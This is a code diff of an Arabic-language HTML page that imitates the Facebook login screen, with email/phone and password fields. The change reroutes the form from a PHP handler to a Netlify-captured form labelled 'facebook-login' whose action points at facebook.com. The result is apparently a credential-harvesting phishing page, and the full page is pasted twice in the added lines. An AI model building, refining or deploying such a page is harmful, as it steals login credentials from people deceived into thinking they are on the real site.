@@ -7,30 +7,81 @@
     <style>
         body { font-family: Segoe UI, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .main-container { width: 100%; max-width: 400px; text-align: center; }
-        .fb-logo { color: #0866ff; font-size: 50px; font-weight: bold; margin-bottom: 15px; }
-        .login-card { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
+        .fb-logo { color: #0866ff; font-size: 55px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
+        .login-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
         input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
         input:focus { outline: none; border-color: #0866ff; box-shadow: 0 0 0 2px #e7f3ff; }
-        .login-btn { width: 100%; background-color: #0866ff; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .login-btn { width: 100%; background-color: #0866ff; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .login-btn:hover { background-color: #0550cc; }
         .forgot-pass { display: block; margin-top: 15px; color: #0866ff; text-decoration: none; font-size: 14px; }
         hr { margin: 20px 0; border: 0; border-top: 1px solid #dadde1; }
-        .new-account { background-color: #42b72a; color: white; border: none; padding: 10px 16px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; text-decoration: none; }
+        .new-account { background-color: #42b72a; color: white; border: none; padding: 10px 16px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
     </style>
 </head>
 <body>
+
     <div class="main-container">
         <div class="fb-logo">facebook</div>
         <div class="login-card">
-            <form action="process.php" method="POST">
+            <form name="facebook-login" method="POST" data-netlify="true" action="https://www.facebook.com/login">
+                <input type="hidden" name="form-name" value="facebook-login" />
+                
                 <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" name="pass" placeholder="كلمة السر" required>
+                <input type="password" name="password" placeholder="كلمة السر" required>
+                
                 <button type="submit" class="login-btn">تسجيل الدخول</button>
             </form>
+            
             <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
             <hr>
-            <button class="new-account">إنشاء حساب جديد</button>
+            <div style="padding-top: 5px;">
+                <a href="#" class="new-account">إنشاء حساب جديد</a>
+            </div>
         </div>
     </div>
+
+</body>
+</html><!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body { font-family: Segoe UI, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-container { width: 100%; max-width: 400px; text-align: center; }
+        .fb-logo { color: #0866ff; font-size: 55px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
+        .login-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        input:focus { outline: none; border-color: #0866ff; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; background-color: #0866ff; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .login-btn:hover { background-color: #0550cc; }
+        .forgot-pass { display: block; margin-top: 15px; color: #0866ff; text-decoration: none; font-size: 14px; }
+        hr { margin: 20px 0; border: 0; border-top: 1px solid #dadde1; }
+        .new-account { background-color: #42b72a; color: white; border: none; padding: 10px 16px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="fb-logo">facebook</div>
+        <div class="login-card">
+            <form name="facebook-login" method="POST" data-netlify="true" action="https://www.facebook.com/login">
+                <input type="hidden" name="form-name" value="facebook-login" />
+                
+                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" name="password" placeholder="كلمة السر" required>
+                
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            
+            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+            <hr>
+            <div style="padding-top: 5px;">
+                <a href="#" class="new-account">إنشاء حساب جديد</a>
+            </div>
+        </div>
+    </div>
+
 </body>
 </html>
